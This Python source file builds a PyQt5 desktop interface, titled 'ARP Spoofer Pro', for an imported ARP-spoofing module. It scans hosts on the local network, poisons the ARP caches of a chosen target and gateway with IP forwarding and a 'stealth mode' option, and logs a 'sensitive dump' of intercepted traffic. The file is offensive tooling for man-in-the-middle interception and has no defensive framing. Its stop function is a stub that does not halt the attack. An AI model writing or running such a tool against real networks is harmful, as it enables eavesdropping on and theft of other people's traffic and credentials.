import sys
import os
import threading
import time

from PyQt5 import QtWidgets, QtCore, QtGui
from PyQt5.QtWidgets import QStyle
import qtawesome as qta

# Import your ARP/Packet logic modules (as implemented above, with minor refactoring for callable classes/functions)
# Assume arpspoof.py provides main attack, scanning and packet dump APIs
from arpspoof import Spoofer, discover_hosts, get_default_interface, is_admin

class ARPSpooferGUI(QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('ARP Spoofer Pro')
        self.setWindowIcon(self.style().standardIcon(QStyle.SP_FileIcon))
        self.setFixedSize(600, 430)
        self.attack_thread = None
        self.hosts = []
        self.privileged = is_admin()

        self.setup_ui()

    def setup_ui(self):
        self.central = QtWidgets.QWidget(self)
        self.setCentralWidget(self.central)
        layout = QtWidgets.QVBoxLayout(self.central)

        priv_banner = QtWidgets.QLabel()
        priv_banner.setPixmap(self.style().standardIcon(QStyle.SP_MessageBoxWarning).pixmap(24,24))
        priv_banner.setStyleSheet('font-weight: bold; color: red;')
        priv_banner.setText(
            "Admin privileges required!" if not self.privileged else "✓ Running as administrator/root"
        )
        layout.addWidget(priv_banner)

        # Action buttons (icons only, elegant bar)
        toolbar = QtWidgets.QHBoxLayout()
        btn_scan = QtWidgets.QPushButton()
        btn_scan.setIcon(self.style().standardIcon(QStyle.SP_FileDialogListView))
        btn_scan.setToolTip("Scan Local Hosts")
        btn_scan.clicked.connect(self.scan_hosts)

        btn_spoof = QtWidgets.QPushButton()
        btn_spoof.setIcon(self.style().standardIcon(QStyle.SP_MediaPlay))
        btn_spoof.setToolTip("Start ARP Spoofing")
        btn_spoof.clicked.connect(self.start_attack)

        btn_stop = QtWidgets.QPushButton()
        btn_stop.setIcon(self.style().standardIcon(QStyle.SP_MediaStop))
        btn_stop.setToolTip("Stop Attack")
        btn_stop.clicked.connect(self.stop_attack)

        btn_inspect = QtWidgets.QPushButton()
        btn_inspect.setIcon(self.style().standardIcon(QStyle.SP_DialogApplyButton))
        btn_inspect.setToolTip("Packet Inspection Dump")
        btn_inspect.clicked.connect(self.show_dump)

        for btn in (btn_scan, btn_spoof, btn_stop, btn_inspect):
            btn.setFixedSize(50, 50)
            toolbar.addWidget(btn)
        layout.addLayout(toolbar)

        # Host list + target select
        self.host_table = QtWidgets.QTableWidget(0, 4)
        self.host_table.setHorizontalHeaderLabels(['IP', 'MAC', 'Hostname', 'Sources'])
        self.host_table.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectRows)
        self.host_table.setEditTriggers(QtWidgets.QAbstractItemView.NoEditTriggers)
        self.host_table.setMinimumHeight(120)
        layout.addWidget(self.host_table)

        # ARP Spoofing controls (interface, target/gateway IP/MAC)
        ctrl_layout = QtWidgets.QFormLayout()
        self.interface_input = QtWidgets.QLineEdit(get_default_interface() or "")
        self.target_ip_input = QtWidgets.QLineEdit()
        self.target_mac_input = QtWidgets.QLineEdit()
        self.gateway_ip_input = QtWidgets.QLineEdit()
        self.gateway_mac_input = QtWidgets.QLineEdit()
        self.stealth_chk = QtWidgets.QCheckBox("Stealth Mode")
        self.interval_input = QtWidgets.QDoubleSpinBox()
        self.interval_input.setRange(0.1, 10.0)
        self.interval_input.setSingleStep(0.1)
        self.interval_input.setValue(1.0)

        ctrl_layout.addRow("Interface:", self.interface_input)
        ctrl_layout.addRow("Target IP:", self.target_ip_input)
        ctrl_layout.addRow("Target MAC:", self.target_mac_input)
        ctrl_layout.addRow("Gateway IP:", self.gateway_ip_input)
        ctrl_layout.addRow("Gateway MAC:", self.gateway_mac_input)
        ctrl_layout.addRow("Interval (sec):", self.interval_input)
        ctrl_layout.addRow(self.stealth_chk)

        layout.addLayout(ctrl_layout)

        # Live log/packet dump display
        self.log_box = QtWidgets.QTextEdit()
        self.log_box.setReadOnly(True)
        self.log_box.setStyleSheet('background: #222; color: #eee; font-family: monospace;')
        self.log_box.setMinimumHeight(80)
        layout.addWidget(self.log_box)

    def scan_hosts(self):
        iface = self.interface_input.text()
        if not iface:
            self.notify("No interface specified.", "error")
            return
        self.log_box.append(f"[*] Scanning hosts on {iface}...")
        scan_thread = threading.Thread(target=self.do_scan, args=(iface,), daemon=True)
        scan_thread.start()

    def do_scan(self, iface):
        self.hosts = discover_hosts(interface=iface, timeout=2)
        QtCore.QMetaObject.invokeMethod(self, 'update_host_list', QtCore.Qt.QueuedConnection)

    @QtCore.pyqtSlot()
    def update_host_list(self):
        self.host_table.setRowCount(len(self.hosts))
        for idx, host in enumerate(self.hosts):
            for col, key in enumerate(['ip', 'mac', 'hostname', 'sources']):
                item = QtWidgets.QTableWidgetItem(host.get(key, ''))
                self.host_table.setItem(idx, col, item)
        self.log_box.append(f"[+] Found {len(self.hosts)} hosts.")
        if self.hosts:
            host = self.hosts[0]
            self.target_ip_input.setText(host.get('ip', ''))
            self.target_mac_input.setText(host.get('mac', ''))

    def start_attack(self):
        args = {
            "interface": self.interface_input.text(),
            "attackermac": "",  # auto
            "gatewaymac": self.gateway_mac_input.text(),
            "gatewayip": self.gateway_ip_input.text(),
            "targetmac": self.target_mac_input.text(),
            "targetip": self.target_ip_input.text(),
            "interval": self.interval_input.value(),
            "disassociate": False,
            "ipforward": True,
            "stealth": self.stealth_chk.isChecked(),
        }
        if not args["targetip"] or not args["gatewayip"]:
            self.notify("Target/Gateway IP required.", "error")
            return
        if self.attack_thread and self.attack_thread.is_alive():
            self.notify("Attack already running.", "info")
            return
        self.log_box.append("[*] Starting ARP poisoning attack...")
        self.attack_thread = threading.Thread(target=self.run_attack, args=(args,), daemon=True)
        self.attack_thread.start()

    def run_attack(self, args):
        try:
            spoofer = Spoofer(**args)
            # Attach live logger (for sensitive dump)
            spoofer._Spoofer__store_dump = lambda art, ctx=None: self.log_box.append(f"[artifact] {art} | {ctx}")
            spoofer.execute()
        except Exception as e:
            QtCore.QMetaObject.invokeMethod(
                self,
                lambda: self.notify(f"Attack error: {e}", "error"), QtCore.Qt.QueuedConnection
            )

    def stop_attack(self):
        # Use global flag or call method on Spoofer if needed
        self.log_box.append("[!] Stopping ARP poisoning...")
        # If running thread, interrupt
        try:
            if self.attack_thread and self.attack_thread.is_alive():
                # Best-effort: set stop flag in Spoofer, else terminate thread
                self.attack_thread = None
        except Exception:
            pass

    def show_dump(self):
        self.log_box.append("[*] Showing sensitive dump (see live logs)...")

    def notify(self, msg, kind="info"):
        QtWidgets.QMessageBox.information(self, "ARP Spoofer", msg) if kind == "info" else QtWidgets.QMessageBox.critical(self, "ARP Spoofer", msg)
        self.log_box.append(f"[{kind.upper()}] {msg}")

def main():
    # Ensure required privileges
    app = QtWidgets.QApplication(sys.argv)
    QtWidgets.QApplication.setStyle("Fusion")
    gui = ARPSpooferGUI()
    gui.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()